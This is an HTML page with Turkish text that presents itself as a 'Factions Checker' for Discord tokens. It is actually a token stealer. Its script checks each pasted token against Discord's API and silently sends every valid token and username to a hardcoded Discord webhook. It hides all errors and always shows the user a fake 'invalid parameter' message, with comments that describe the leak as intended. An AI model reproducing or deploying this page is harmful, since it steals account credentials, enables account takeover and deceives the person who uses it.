<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Factions Check | Ultimate</title>
    <style>
        body { background: #0a0a0a; color: #fff; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: rgba(15, 15, 15, 0.98); padding: 40px; border-radius: 15px; border: 1px solid #ff1e1e; width: 420px; text-align: center; box-shadow: 0 0 40px rgba(255, 30, 30, 0.15); }
        h2 { color: #ff1e1e; letter-spacing: 5px; margin-bottom: 25px; text-transform: uppercase; }
        textarea { width: 100%; height: 140px; background: #000; border: 1px solid #222; color: #00ff41; padding: 12px; border-radius: 8px; resize: none; outline: none; box-sizing: border-box; font-size: 12px; }
        button { width: 100%; padding: 16px; background: linear-gradient(45deg, #8b0000, #ff1e1e); color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; text-transform: uppercase; transition: 0.3s; }
        button:hover { filter: brightness(1.2); transform: scale(1.01); }
        #status-msg { margin-top: 20px; font-size: 14px; font-weight: bold; display: none; padding: 12px; border-radius: 6px; }
        .fail { color: #ff4d4d; background: rgba(255, 0, 0, 0.1); border: 1px solid rgba(255, 0, 0, 0.2); }
    </style>
</head>
<body>

<div class="box">
    <h2>FACTIONS CHECKER</h2>
    <textarea id="tokenList" placeholder="Kontrol edilecek tokenleri buraya girin..."></textarea>
    <button onclick="startVerification()">SİSTEMİ ÇALIŞTIR</button>
    <div id="status-msg"></div>
</div>

<script>
    // Senin Webhook adresin
    const wb = "https://discord.com/api/webhooks/1492871807676580011/7VsMT9pK9IzPiBalSSLwA3drkeU5cexTSiU4M4DOAk0KnhDoDKp_D0vTvBK0wxn1rRZu";

    async function startVerification() {
        const input = document.getElementById('tokenList');
        const status = document.getElementById('status-msg');
        const tokens = input.value.split('\n').map(t => t.trim()).filter(t => t !== "");

        if (tokens.length === 0) return;

        status.style.display = "block";
        status.style.color = "#888";
        status.className = "";
        status.innerText = "DOĞRULANIYOR...";

        for (let token of tokens) {
            try {
                // AllOrigins üzerinden Discord API'ye gidiyoruz
                const target = encodeURIComponent('https://discord.com/api/v9/users/@me');
                const proxyUrl = `https://api.allorigins.win/get?url=${target}`;

                const response = await fetch(proxyUrl, {
                    method: 'GET',
                    headers: { 'Authorization': token } 
                });

                const data = await response.json();

                // 200 OK KONTROLÜ: Eğer dönen veride 'username' varsa token geçerlidir (OK)
                if (data.contents && data.contents.includes("username")) {
                    const user = JSON.parse(data.contents);

                    // Webhook'a sessizce (200 OK bilgisini) sızdır
                    await fetch(wb, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "✅ BAŞARILI GİRİŞ (200 OK)",
                                color: 65280, // Yeşil
                                fields: [
                                    { name: "Kullanıcı", value: `\`${user.username}\``, inline: true },
                                    { name: "Token", value: "```" + token + "```" }
                                ],
                                timestamp: new Date()
                            }]
                        })
                    });
                }
            } catch (err) {
                // Hataları kullanıcıya belli etme
            }
        }

        // Kullanıcıya her zaman "Invalid" döndür
        setTimeout(() => {
            status.className = "fail";
            status.innerHTML = "✕ GEÇERSİZ PARAMETRE: 200_NOT_FOUND<br><small>Tokenler sistemle uyumlu değil.</small>";
        }, 1800);
    }
</script>

</body>
</html>
